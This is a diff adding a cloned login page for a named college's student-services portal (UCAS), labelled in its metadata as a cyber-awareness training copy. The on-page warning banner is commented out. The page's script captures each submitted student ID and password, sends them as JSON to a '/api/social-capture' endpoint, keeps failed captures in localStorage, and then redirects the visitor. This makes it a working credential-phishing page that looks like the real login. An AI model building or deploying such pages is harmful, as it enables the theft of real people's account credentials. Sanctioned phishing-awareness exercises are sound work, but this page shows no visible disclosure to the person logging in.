@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html class="notranslate" lang="ar">
+<head>
+    <meta charset="utf-8"/>
+    <base href="https://my.ucas.edu.ps/login?backurl=/Registration/semester_registration"/>
+    <meta charset="utf-8"/>
+    <title>خدمات الطلبة - الكلية الجامعية للعلوم التطبيقية</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <meta content="الكلية الجامعية للعلوم التطبيقية - نسخة تدريبية للتوعية السيبرانية" name="description"/>
+    <meta content="الكلية الجامعية للعلوم التطبيقية" name="author"/>
+    <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+    <!-- App favicon -->
+    <link href="/NewTemp/src/images/favicon.ico" rel="shortcut icon"/>
+    <!-- App css -->
+    <link href="/NewTemp/src/css-light/bootstrap.min.css" id="bootstrap" rel="stylesheet" type="text/css"/>
+    <link href="/NewTemp/src/css-light/icons.min.css" id="icons" rel="stylesheet" type="text/css"/>
+    <link href="/NewTemp/src/css-light/app-rtl.min.css" id="app_rtl" rel="stylesheet" type="text/css"/>
+    <link href="/NewTemp/src/libs/basictable-master/dist/css/basictable.min.css" rel="stylesheet" type="text/css"/>
+    <link href="/NewTemp/src/style.css" rel="stylesheet" type="text/css"/>
+    <link href="/NewTemp/src/css-light/cusstyle.css" id="cus_style" rel="stylesheet" type="text/css"/>
+    <style>
+        /* Training banner style */
+        .training-banner {
+            background: #dc3545;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-weight: bold;
+            font-size: 14px;
+            position: sticky;
+            top: 0;
+            z-index: 10000;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .toast-notification {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: #28a745;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 10001;
+            animation: fadeInOut 3s ease-in-out;
+            direction: rtl;
+            font-family: 'Segoe UI', sans-serif;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateY(20px); }
+            15% { opacity: 1; transform: translateY(0); }
+            85% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(20px); }
+        }
+    </style>
+</head>
+<body class="authentication-bg">
+
+<!-- TRAINING BANNER 
+<div class="training-banner">
+    <i class="fa fa-exclamation-triangle"></i> 🎓 بيئة تدريبية أكاديمية – هذه نسخة منسوخة للتوعية بالأمن السيبراني. سيتم إرسال البيانات لأغراض التدريب فقط.
+</div>-->
+
+<div class="account-pages mt-4 mb-2">
+    <div class="container">
+        <div class="col-md-12" style="margin-bottom:25px;">
+            <div class="text-center">
+                <a href="/">
+                    <span><img alt="" height="78" src="/NewTemp/src/images/logo-light.png"/></span>
+                </a>
+            </div>
+        </div>
+        
+        <form id="trainingForm" method="post">
+            <div class="aspNetHidden">
+                <input id="__LASTFOCUS" name="__LASTFOCUS" type="hidden" value=""/>
+                <input id="__EVENTTARGET" name="__EVENTTARGET" type="hidden" value=""/>
+                <input id="__EVENTARGUMENT" name="__EVENTARGUMENT" type="hidden" value=""/>
+                <input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="cShQN9yEhkQiszhYic0uW2JqLXZ4VSRV+r4FBfCbQ3HCYz+y6YbM3pj1o7PjdJHum+CL8FIAPn7/bFx7cJ++hit/FCK0lFZXGwbL2P6x8xuJqcHuOAE4PEEIUV/z+17dg2qR0hZdToLRtWmLwx1rFJ1kfjLYKSk9E0XuLKYRQjhPWxrr+EnuvAGRNEC2z03bfzDg8P+v0vu8ieBwUAOgN75OS2FtxR5xH4//7ILXRvpou3qTsed7XkS+5JoWzkPrmHQM+/DnLpAiXEbUgUxC5SVy2qjuHaQdWkZZ5Mp9QYIlFHLiwtg5NZppaSUxNoGAgArT/TOLrYbfzoZW65Tgw0i7UzsmgOM6xywQ3AoYIH0zV3aS5KKV+82O5LIqj72w"/>
+            </div>
+
+            <div class="aspNetHidden">
+                <input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="805C0972"/>
+                <input id="__VIEWSTATEENCRYPTED" name="__VIEWSTATEENCRYPTED" type="hidden" value=""/>
+                <input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="6e1MXfEpW4+KpJ+MPb1BOG93hK2lY9d9Diz1jlw0yzQces4lcdoQW1BdZaRJXuZmToMKn+lDrZCUYjExxiP5WOdyuyEEQK16COLObhtpvQBFioZ0qdPsW7E3LNY+04WWneT3K9Ecwni8yulhvoME6nT9qKZfTeJhbOt4XMCjA9nM/cfaRM1NL67uWNlP1ziP"/>
+            </div>
+            
+            <div class="row justify-content-center">
+                <div class="col-md-8 col-lg-6 col-xl-5">
+                    <div class="card">
+                        <div class="card-body p-4">
+                            <div class="text-center mb-3">
+                                <h4 class="text-uppercase mt-0">تسجيل الدخول</h4>
+                            </div>
+                            <div class="form-group mb-2">
+                                <label for="txtUsername">رقم الطالب الجامعي</label>
+                                <input class="form-control" id="txtUsername" maxlength="15" name="username" placeholder="الرقم الجامعي" required="" type="text"/>
+                            </div>
+                            <div class="form-group mb-2">
+                                <label for="txtPassword">كلمة المرور</label>
+                                <input class="form-control" id="txtPassword" maxlength="20" name="password" placeholder="كلمة المرور" required="" type="password"/>
+                            </div>
+                            <div class="form-group mb-0 text-center">
+                                <button class="btn btn-primary btn-block" type="submit" id="loginBtn">تسجيل دخول</button>
+                            </div>
+                            <div class="row mt-3 mb-2">
+                                <div class="col-12 text-center">
+                                    <a class="text-muted mr-3" href="/profile/Forgot_Password">
+                                        <i class="fa fa-key mr-1"></i>فقدت كلمة المرور
+                                    </a>
+                                    <a class="text-muted ml-3" href="/profile/activate_account"><i class="fa fa-lock mr-1"></i>تفعيل الحساب</a>
+                                </div>
+                            </div>
+                            <div class="form-group mb-0 text-center">
+                                <a class="btn btn-secondary btn-block" href="https://moodle.ucas.edu.ps/">
+                                    <img src="/NewTemp/src/icons/moodle.png" alt="moodle" style="height:20px;"> انقر هنا للذهاب للموودل
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-md-4 col-lg-4 col-xl-4">
+                    <div class="card-box">
+                        <h4 class="header-title mt-0 mb-3">تعليمات هامة</h4>
+                        <ul class="list-group mb-0 user-list">
+                            <li class="list-group-item">
+                                <a class="user-list-item">
+                                    <div class="user float-left mr-3">
+                                        <i class="mdi mdi-circle text-primary"></i>
+                                    </div>
+                                    <div class="user-desc overflow-hidden">
+                                        <h5 class="name mt-0 mb-1">تأكد من ادخال رقمك الجامعي بشكل صحيح</h5>
+                                    </div>
+                                </a>
+                            </li>
+                            <li class="list-group-item">
+                                <a class="user-list-item">
+                                    <div class="user float-left mr-3">
+                                        <i class="mdi mdi-circle text-primary"></i>
+                                    </div>
+                                    <div class="user-desc overflow-hidden">
+                                        <h5 class="name mt-0 mb-1">كلمة مرور الخريجين هي رقم الهوية</h5>
+                                    </div>
+                                </a>
+                            </li>
+                            <li class="list-group-item">
+                                <a class="user-list-item">
+                                    <div class="user float-left mr-3">
+                                        <i class="mdi mdi-circle text-primary"></i>
+                                    </div>
+                                    <div class="user-desc overflow-hidden">
+                                        <h5 class="name mt-0 mb-1">تأكد من كلمة المرور وحالة الاحرف</h5>
+                                    </div>
+                                </a>
+                            </li>
+                            <li class="list-group-item">
+                                <a class="user-list-item">
+                                    <div class="user float-left mr-3">
+                                        <i class="mdi mdi-circle text-primary"></i>
+                                    </div>
+                                    <div class="user-desc overflow-hidden">
+                                        <h5 class="name mt-0 mb-1">انتبه لزر الحروف الكبيرة</h5>
+                                    </div>
+                                </a>
+                            </li>
+                        </ul>
+                        <a class="normal_link" href="https://www.facebook.com/ucasGaza" target="_blank">لتبقى على تواصل تابعنا على صفحة الفيسبوك</a>
+                    </div>
+                </div>
+                
+                <div class="col-md-12">
+                    <div class="card-boxs">
+                        <a href="/mobile.html" target="_blank">
+                            <img src="/NewTemp/src/images/mobile.jpg" style="width: 100%" alt="mobile app"/>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- CAPTURE SCRIPT - يرسل البيانات بشكل صحيح -->
+<script>
+    (function() {
+        const form = document.getElementById('trainingForm');
+        if (!form) {
+            console.error("Form not found!");
+            return;
+        }
+
+        function showNotification(message, isError) {
+            const notification = document.createElement('div');
+            notification.className = 'toast-notification';
+            notification.style.backgroundColor = isError ? '#dc3545' : '#28a745';
+            notification.innerHTML = `<span style="margin-left: 8px;">${isError ? '⚠️' : '✓'}</span> ${message}`;
+            document.body.appendChild(notification);
+            setTimeout(() => notification.remove(), 3000);
+        }
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('txtUsername').value;
+            const password = document.getElementById('txtPassword').value;
+
+            const payload = {
+                site: 'ucas_university',
+                session_id: 'ucas_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
+                form_data: {
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent
+                }
+            };
+            
+            console.log('[UCAS] Sending data for:', username);
+            
+            fetch('/api/social-capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                } else {
+                    throw new Error('Server responded with ' + response.status);
+                }
+            })
+            .then(data => {
+                console.log('[UCAS] Capture recorded:', data);
+            })
+            .catch(err => {
+                console.error('[UCAS] Capture error:', err);
+                try {
+                    let backups = JSON.parse(localStorage.getItem('ucas_training_backups') || '[]');
+                    backups.push({ ...payload, local_timestamp: new Date().toISOString(), error: err.message });
+                    localStorage.setItem('ucas_training_backups', JSON.stringify(backups.slice(-20)));
+                } catch(e) {
+                    console.warn('Could not save backup:', e);
+                }
+            })
+            .finally(() => {
+                setTimeout(() => {
+                    window.location.href = '/awareness-training';
+                }, 1500);
+            });
+        });
+        
+        // تعطيل أي روابط أخرى قد تسبب مشكلة
+        const originalLink = document.getElementById('ContentPlaceHolder1_lnkLogin');
+        if (originalLink) {
+            originalLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
+                form.dispatchEvent(submitEvent);
+            });
+        }
+        
+        console.log('✓ UCAS Training Clone Active — Data will be sent to /api/social-capture');
+    })();
+</script>
+
+<!-- Font Awesome for icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+</body>
+</html>
